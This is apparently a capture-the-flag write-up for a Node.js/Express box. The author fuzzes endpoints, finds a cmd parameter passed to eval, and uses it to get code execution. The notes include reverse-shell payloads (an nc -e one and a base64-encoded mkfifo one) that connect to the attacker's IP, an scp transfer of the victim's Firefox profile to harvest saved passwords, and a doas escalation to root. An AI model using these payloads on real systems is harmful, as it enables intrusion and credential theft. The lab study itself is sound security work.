
nmap:

```console
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: not allowed
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

port 80 analysis:

```console
$ curl http://10.48.169.171/ -s
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>

$ curl http://10.48.169.171/api/access -s
{"token":"dGhpc19pc19ub3RfcmVhbA=="}

$ curl http://10.48.169.171/api/access -s | jq -r ".token" | base64 -d
this_is_not_real
```

don't know what's that supposed to mean but let's start fuzzing:

```console
$ ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/raft-large-words.txt -ac -c -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.169.171/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/raft-large-words.txt
 :: Follow redirects : true
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.                       [Status: 200, Size: 724, Words: 199, Lines: 33, Duration: 45ms]
secret                  [Status: 200, Size: 724, Words: 199, Lines: 33, Duration: 41ms]
Secret                  [Status: 200, Size: 724, Words: 199, Lines: 33, Duration: 43ms]
:: Progress: [119600/119600] :: Job [1/1] :: 836 req/sec :: Duration: [0:03:17] :: Errors: 0 ::

$ curl http://$ip/ -I
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 06 Jun 2026 16:03:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 724
Connection: keep-alive
X-Powered-By: Express
Set-Cookie: token=value; Path=/
ETag: W/"2d4-9vv1ycPBiNQXrvbVqqN9dD9MWUM"
```


The `Set-Cookie` header is interesting the server might be expecting it in `/secret`

```
$ curl http://$ip/secret -b "token=dGhpc19pc19ub3RfcmVhbA=="
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>
```

Nope let's move back to fuzzing the `/api` path now:


paths found by ffuf:
- http://$ip/api/items gives the below json

```json
{
  "sins": [
    "lust",
    "gluttony",
    "greed",
    "sloth",
    "wrath",
    "envy",
    "pride"
  ],
  "errors": [
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error"
  ],
  "deaths": [
    "death"
  ]
}
```


Analysis

```console
$ curl http://$ip/api/items/ -s | jq .sins[] -r
lust
gluttony
greed
sloth
wrath
envy
pride


$ curl http://$ip/api/items/ -s | jq .sins[] -r | ffuf -u http://$ip/api/items/FUZZ -w - -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.169.171/api/items/FUZZ
 :: Wordlist         : FUZZ: -
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

sloth                   [Status: 404, Size: 154, Words: 6, Lines: 11, Duration: 41ms]
greed                   [Status: 404, Size: 154, Words: 6, Lines: 11, Duration: 41ms]
lust                    [Status: 404, Size: 153, Words: 6, Lines: 11, Duration: 41ms]
envy                    [Status: 404, Size: 153, Words: 6, Lines: 11, Duration: 41ms]
pride                   [Status: 404, Size: 154, Words: 6, Lines: 11, Duration: 41ms]
gluttony                [Status: 404, Size: 157, Words: 6, Lines: 11, Duration: 41ms]
wrath                   [Status: 404, Size: 154, Words: 6, Lines: 11, Duration: 42ms]
:: Progress: [7/7] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

$curl http://$ip/api/items/ -s | jq .sins[] -r | ffuf -u http://$ip/api/sins/FUZZ -w - -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.169.171/api/sins/FUZZ
 :: Wordlist         : FUZZ: -
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

pride                   [Status: 404, Size: 153, Words: 6, Lines: 11, Duration: 41ms]
...
<!-- SNIP -->

```

Tried fuzzing with different combination but couldn't hit anything sensitive

there was a background image `/img/glitch.jpg` but it didn't contain any steganography data so i decided to try and fuzz for it instead:

```console
$ ffuf -u "http://10.48.169.171/img/FUZZ.jpg" -w /usr/share/wordlists/rockyou.txt -ac -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.169.171/img/FUZZ.jpg
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

death                   [Status: 200, Size: 5569, Words: 16, Lines: 21, Duration: 42ms]
rose                    [Status: 200, Size: 43105, Words: 198, Lines: 218, Duration: 44ms]
error                   [Status: 200, Size: 12488, Words: 50, Lines: 54, Duration: 42ms]

$ curl http://$ip/api/items/ -s | jq .sins[] -r | ffuf -u http://$ip/img/FUZZ.jpg -w - -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.169.171/img/FUZZ.jpg
 :: Wordlist         : FUZZ: -
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

lust                    [Status: 404, Size: 151, Words: 6, Lines: 11, Duration: 45ms]
envy                    [Status: 404, Size: 151, Words: 6, Lines: 11, Duration: 42ms]
wrath                   [Status: 404, Size: 152, Words: 6, Lines: 11, Duration: 45ms]
sloth                   [Status: 404, Size: 152, Words: 6, Lines: 11, Duration: 44ms]
gluttony                [Status: 404, Size: 155, Words: 6, Lines: 11, Duration: 361ms]
greed                   [Status: 404, Size: 152, Words: 6, Lines: 11, Duration: 361ms]
pride                   [Status: 404, Size: 152, Words: 6, Lines: 11, Duration: 358ms]

$ binwalk error.jpg rose.jpg death.jpg 

Scan Time:     2026-06-06 22:02:00
Target File:   /home/ayux/Downloads/error.jpg
MD5 Checksum:  2ca7edd3efbebe9b358ca9cef56a7936
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


Scan Time:     2026-06-06 22:02:00
Target File:   /home/ayux/Downloads/rose.jpg
MD5 Checksum:  e82d1bbe0ad2e9cb191f5f1faa4fa910
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
30            0x1E            TIFF image data, little-endian offset of first image directory: 8


Scan Time:     2026-06-06 22:02:00
Target File:   /home/ayux/Downloads/death.jpg
MD5 Checksum:  18d29b4cb977752428cd2c574514eb32
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```

none of em contained anything again as hidden data going back i did a mistake i sent the token as base64 when checking the secret but not as plain text sending the token in plain text it was giving a different background image which looks it contained hidden data  (not_to_myself: always refuzz parameters with new token also don't expect devs would use encoded cookies standard)

```console
┌─[ayux@parrot]─[~/Desktop/wordlists]
└──╼ $curl http://$ip/secret
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>
┌─[ayux@parrot]─[~/Desktop/wordlists]
└──╼ $curl http://$ip/secret -b "token=this_is_not_real"
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>nothing.</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/rabbit.png') repeat;
      }
    </style>
  </head>
  <body></body>
</html>
┌─[ayux@parrot]─[~/Downloads]
└──╼ $binwalk -e rabbit.png -Me

Scan Time:     2026-06-06 22:13:49
Target File:   /home/ayux/Downloads/rabbit.png
MD5 Checksum:  4b478d2e665a958fa51bc6ada5352b64
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
121           0x79            Zlib compressed data, compressed

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented


Scan Time:     2026-06-06 22:13:49
Target File:   /home/ayux/Downloads/_rabbit.png.extracted/79
MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

┌─[ayux@parrot]─[~/Downloads]
└──╼ $cat /home/ayux/Downloads/_rabbit.png.extracted/79
┌─[ayux@parrot]─[~/Downloads]
└──╼ $file /home/ayux/Downloads/_rabbit.png.extracted/79
/home/ayux/Downloads/_rabbit.png.extracted/79: empty
┌─[ayux@parrot]─[~/Downloads/_rabbit.png.extracted]
└──╼ $openssl zlib -d -in 79.zlib -out extracted.bin
4017099D377F0000:error:14800064:lib(41):bio_zlib_read:zlib inflate error:../crypto/comp/c_zlib.c:477:zlib error: data error
```

the zlib file to get extracted due to same error idk about okay i will come back to it later 

i created a file of all the urls we found through so far:

```
http://10.48.169.171/
http://10.48.169.171/api/items
http://10.48.169.171/secret
http://10.48.169.171/api/access
```


first i checked for different methods in em:

```
$cat urls.txt | httpx -x all -bp

    __    __  __       _  __
   / /_  / /_/ /_____ | |/ /
  / __ \/ __/ __/ __ \|   /
 / / / / /_/ /_/ /_/ /   |
/_/ /_/\__/\__/ .___/_/|_|
             /_/

		projectdiscovery.io

[INF] Current httpx version v1.9.0 (latest)
[WRN] UI Dashboard is disabled, Use -dashboard option to enable
http://10.48.169.171/api/items [TRACE] [405 Not Allowednginx/1.14.0 (Ubuntu)]
http://10.48.169.171/api/items [POST] [{&#34;message&#34;:&#34;there_is_a_glitch_in_the_matrix&#34;}]
http://10.48.169.171/ [TRACE] [405 Not Allowednginx/1.14.0 (Ubuntu)]
http://10.48.169.171/api/items [OPTIONS] [GET,HEAD,POST]
http://10.48.169.171/ [POST] [Cannot POST /]
http://10.48.169.171/ [CONNECT] [502 Bad Gatewaynginx/1.14.0 (Ubuntu)]
http://10.48.169.171/ [OPTIONS] [GET,HEAD]
http://10.48.169.171/ [PATCH] [Cannot PATCH /]
http://10.48.169.171/secret [OPTIONS] [GET,HEAD]
http://10.48.169.171/secret [TRACE] [405 Not Allowednginx/1.14.0 (Ubuntu)]
http://10.48.169.171/ [DELETE] [Cannot DELETE /]
http://10.48.169.171/api/items [CONNECT] [502 Bad Gatewaynginx/1.14.0 (Ubuntu)]
http://10.48.169.171/secret [POST] [Cannot POST /secret]
http://10.48.169.171/secret [GET] []
http://10.48.169.171/api/items [GET] [{&#34;sins&#34;:[&#34;lust&#34;,&#34;gluttony&#34;,&#34;greed&#34;,&#34;sloth&#34;,&#34;wrath&#34;,&]
http://10.48.169.171/ [HEAD] []
http://10.48.169.171/api/items [PATCH] [Cannot PATCH /api/items]
http://10.48.169.171/secret [PATCH] [Cannot PATCH /secret]
http://10.48.169.171/secret [CONNECT] [502 Bad Gatewaynginx/1.14.0 (Ubuntu)]
http://10.48.169.171/ [GET] []
http://10.48.169.171/secret [HEAD] []
http://10.48.169.171/api/items [DELETE] [Cannot DELETE /api/items]
http://10.48.169.171/ [PUT] [Cannot PUT /]
http://10.48.169.171/api/items [HEAD] []
http://10.48.169.171/api/items [PUT] [Cannot PUT /api/items]
http://10.48.169.171/secret [DELETE] [Cannot DELETE /secret]
http://10.48.169.171/secret [PUT] [Cannot PUT /secret]
```

interesting output: `http://10.48.169.171/api/items [POST] [{&#34;message&#34;:&#34;there_is_a_glitch_in_the_matrix&#34;}]`

let's check if there are hidden params in it:

```
$ ffuf -u "http://10.48.169.171/api/items?FUZZ=foobar" -w ~/Desktop/wordlists/SecLists/Discovery/Web-Content/api/objects.txt -ac -c -X POST -H "Cookie: token=this_is_not_real"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.48.169.171/api/items?FUZZ=foobar
 :: Wordlist         : FUZZ: /home/ayux/Desktop/wordlists/SecLists/Discovery/Web-Content/api/objects.txt
 :: Header           : Cookie: token=this_is_not_real
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cmd                     [Status: 500, Size: 1083, Words: 55, Lines: 11, Duration: 44ms]

┌─[ayux@parrot]─[/tmp]
└──╼ $curl "http://10.48.169.171/api/items?cmd=whoami" -X POST
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: whoami is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```

looks like the app is taking the value from`cmd` parameter and hitting the `eval` sink with my value. for exploiting this simply searched node.js on revshell dot com

payload tried:

```
require('child_process').exec('nc -e sh 192.168.247.244 9001')
```

![[Pasted image 20260606231506.png|697]]

tested curl instead with `require('child_process').exec('curl http://192.168.247.244:8000')` we did get a hit so our command is executing maybe  something is breaking our payload let's try classic mkfifo payload encoded in base64 then pipe it through bash

```
require('child_process').exec('echo+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMjQ3LjI0NCA5MDAxID4vdG1wL2YK+|base64+-d+|bash')	
```

we got the shell !

```
$ ls -la
total 48
drwxr-xr-x   8 user user  4096 Jan 27  2021 .
drwxr-xr-x   4 root root  4096 Jan 15  2021 ..
lrwxrwxrwx   1 root root     9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
drwx------   2 user user  4096 Jan  4  2021 .cache
drwxrwxrwx   4 user user  4096 Jan 27  2021 .firefox
drwx------   3 user user  4096 Jan  4  2021 .gnupg
drwxr-xr-x 270 user user 12288 Jan  4  2021 .npm
drwxrwxr-x   5 user user  4096 Jun  6 15:38 .pm2
drwx------   2 user user  4096 Jan 21  2021 .ssh
-rw-rw-r--   1 user user    22 Jan  4  2021 user.txt
```

`.firefox` could have other users password

```
$ rm firefox.zip
$ zip firefox.zip .firefox
sh: 4: zip: not found
$ tar -czf firefox.tar.gz .firefox
$ ls
firefox.tar.gz
user.txt
user@ubuntu:~$ scp firefox.tar.gz ayux@192.168.247.244:/tmp
scp firefox.tar.gz ayux@192.168.247.244:/tmp
ayux@192.168.247.244's password: parrot

firefox.tar.gz                                100%  973KB 371.3KB/s   00:02    
```

open in ff -> show passwords

```
$ firefox --profile b5w4643p.default-release/ --allow-downgrade
```

![[Pasted image 20260607000019.png]]

got ssh password of another user, escalating to root now:

```console
v0id@ubuntu:~$ find / -type f -perm -04000 2>/dev/null
find / -type f -perm -04000 2>/dev/null
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/doas
v0id@ubuntu:~$ doas -u root id
doas -u root id
Password: love_the_void

uid=0(root) gid=0(root) groups=0(root)
v0id@ubuntu:~$
```


DONE !!